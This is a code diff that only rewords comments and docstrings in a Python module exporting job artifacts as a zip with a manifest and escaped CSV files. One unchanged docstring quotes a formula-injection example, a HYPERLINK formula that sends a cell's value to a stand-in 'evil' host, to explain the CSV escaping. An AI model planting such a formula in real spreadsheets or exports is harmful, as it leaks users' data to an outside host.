@@ -21,7 +21,7 @@ _FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
 
 
 def csv_cell(value: Any) -> str:
-    """One CSV cell: quoted where the format needs it, defused where a spreadsheet would run it.
+    """One CSV cell, quoted where needed and safe to open in a spreadsheet.
 
     Table cells can contain names from uploaded logs, so a cell like
     ``=HYPERLINK("http://evil/"&A1,"click")`` would be evaluated by Excel or LibreOffice.
@@ -66,7 +66,7 @@ def _build_manifest(job: dict[str, Any]) -> dict[str, Any]:
     can answer 'what version was this run, and with which parameters?'
     weeks later without grepping the codebase.
 
-    Intentionally lightweight — no embedded log bytes, no executable code.
+    Lightweight: no embedded log bytes, no executable code.
     Filename SHA / log size aren't recorded because the raw input log is
     no longer on disk by the time the export runs.
     """
@@ -121,7 +121,7 @@ async def download_job_artifacts(job_id: str) -> StreamingResponse:
     # Create in-memory zip
     zip_buffer = io.BytesIO()
     with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
-        # Run manifest — lightweight reproducibility metadata.
+        # Run manifest with basic reproducibility metadata.
         try:
             manifest = _build_manifest(job)
             zip_file.writestr("manifest.json", json.dumps(manifest, indent=2, default=str))
@@ -170,7 +170,7 @@ async def download_job_artifacts(job_id: str) -> StreamingResponse:
                 cols = art.get("columns", [])
                 rows = art.get("rows", [])
                 csv_buffer = io.StringIO()
-                # Column names go through the same escaping as the cells — they come from
+                # Column names go through the same escaping as the cells, since they come from
                 # algorithm output and are no more trustworthy than the rows below them.
                 csv_buffer.write(",".join(csv_cell(c) for c in cols) + "\n")
                 for row in rows:
